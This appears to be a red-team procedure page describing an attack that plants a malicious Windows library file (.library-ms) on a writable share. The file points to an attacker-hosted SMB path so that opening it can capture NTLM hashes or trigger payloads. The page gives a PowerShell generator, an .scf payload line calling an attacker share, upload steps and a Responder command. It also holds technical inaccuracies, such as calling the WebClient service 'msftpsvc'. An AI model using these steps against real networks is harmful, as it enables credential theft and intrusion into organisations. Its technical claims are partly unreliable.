---
type: procedure
tactics:
  - '[[Execution]]'
  - '[[Lateral Movement]]'
techniques:
  - '[[Malicious File]]'
  - '[[SMB-Windows Admin Shares]]'
sub_techniques: []
tags:
  - active-directory-attacks
  - scf-url-file-attack
  - windows-library-files
commands:
  - '[[commands/powershell-create-library-file]]'
tools: []
platforms:
  - Windows
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# SCF-and-URL-File-Attack-Against-Writable-Share-via-Windows-Library-Files

## Summary

This procedure details how to create and deploy a malicious Windows Library File (.library-ms) that references a remote malicious .scf or .url file hosted on an attacker-controlled server. When a victim opens the library file from a writable share, Windows Explorer automatically fetches and executes the remote file, potentially leading to arbitrary code execution, such as launching a reverse shell or downloading malware. This technique leverages the auto-loading behavior of library files to bypass some execution restrictions and is effective in Active Directory environments with accessible writable shares.

## Description

Windows Library Files (.library-ms) are XML-based containers that organize shortcuts to files and folders, allowing quick access to common locations. Attackers exploit this by embedding a reference to a malicious Shell Command File (.scf) or Internet Shortcut (.url) in the library's search connector URL. The .scf file can execute commands via icon fetching from a remote SMB or WebDAV share, while .url files can trigger network requests or downloads. Upon opening the .library-ms file, Windows parses the XML, resolves the UNC path (e.g., \\attacker@port\share), authenticates to the attacker's server using the victim's credentials, and executes the malicious content. This can result in NTLM hash capture, code execution, or lateral movement. The attack requires write access to a share that the victim browses, common in domain environments with misconfigured permissions. It maps to MITRE ATT&CK for execution via user interaction with malicious files and lateral movement over SMB shares.

## Requirements

1. Write access to a network share (e.g., SMB share) that the target user can browse, such as a public or departmental folder in an Active Directory environment.
2. An attacker-controlled server hosting the malicious .scf or .url file, accessible via SMB (port 445) or WebDAV (port 80/443), with NTLM authentication enabled for hash capture.
3. Tools to create and host files: a Windows machine or PowerShell for generating the .library-ms file, and a server like Responder or an SMB share for hosting the payload.
4. Knowledge of the target's domain credentials or ability to relay captured NTLM hashes.

## Defense

- Implement least privilege access to shares, restricting write permissions to authorized users only and monitoring share access logs.
- Disable the WebClient service (msftpsvc) on Windows systems to prevent automatic fetching of remote .scf/.url files: `sc config webclient start= disabled`.
- Enable SMB signing and restrict NTLM authentication; use tools like Microsoft Defender for Endpoint to detect anomalous SMB traffic and file executions.
- Educate users on avoiding unknown library files and monitor for connections to suspicious UNC paths via Sysmon (Event ID 3 for network connections).

## Objectives

1. Execute arbitrary code on the target system via user interaction with the library file.
2. Capture NTLM hashes from the victim's authentication to the remote share for further lateral movement or pass-the-hash attacks.
3. Gain elevated privileges or persistent access by delivering payloads like reverse shells through the executed .scf/.url.

## Instructions

### Step 1: Prepare the Malicious SCF or URL File on Attacker Server

**Context**: First, create and host a malicious .scf file on your server to execute commands or capture hashes. For example, an .scf file can reference an icon from your SMB share, triggering NTLM auth. Use a tool like Responder to listen for hashes, or host a simple .url that downloads and runs a payload.

Host the file on an SMB share, e.g., \\attacker-ip\share\malicious.scf, where the .scf content includes: `[Shell] Command=2 IconFile=\\attacker-ip\share\payload.exe IconIndex=1` (replace with your payload).

No specific command here; use a file editor to create and upload the .scf/.url to your server.

**Expected Output**: Malicious file accessible via UNC path, ready to trigger on fetch.

### Step 2: Create the Malicious Library File Using XML Template

**Context**: Generate the .library-ms file with an embedded UNC path pointing to your malicious .scf/.url. This tricks Windows into loading the remote file when the library is opened. The XML uses a search connector with a UNC URL formatted as \\server@port\share to force authentication.

**Code** ([[codes/Malicious-Windows-Library-Description-XML]]):

Embed the XML content into a PowerShell script to create the file.

**Command** ([[commands/powershell-create-library-file]]):

```powershell
$xmlContent = @'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\$_ATTACKER_SERVER@$_ATTACKER_PORT\$_SHARE</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
'@
Out-File -FilePath "malicious.library-ms" -Encoding UTF8 -InputObject $xmlContent
```

> This command outputs the XML to a .library-ms file. Replace placeholders like $_ATTACKER_SERVER with your IP (e.g., 192.168.1.100), $_ATTACKER_PORT with 445, and $_SHARE with the share name containing the .scf/.url. The UNC path in the URL triggers the fetch.

**Expected Output**: A file named malicious.library-ms created with the XML content, ready for placement on the share.

### Step 3: Deploy the Library File to the Writable Share

**Context**: Copy the generated .library-ms file to the target writable share that the victim is likely to access, such as a monitored folder or shared drive. Name it innocuously, e.g., "Documents.library-ms", to entice opening.

Use SMB to upload: `copy malicious.library-ms \\target-share\path\` or via PowerShell `Copy-Item`.

**Expected Output**: File successfully uploaded to the share, visible to the victim.

### Step 4: Monitor for Execution and Capture

**Context**: Wait for the victim to open the library file in Explorer. Monitor your server for incoming NTLM auth or payload execution.

Start Responder or your SMB listener: `responder -I eth0 -wrf` to capture hashes.

**Expected Output**: Victim's machine connects to your server, authenticates, and executes the .scf/.url, potentially relaying hashes or running code.

**Success Indicators**:
- Network connection from victim to attacker server on port 445.
- Captured NTLM hash or successful payload execution (e.g., reverse shell callback).
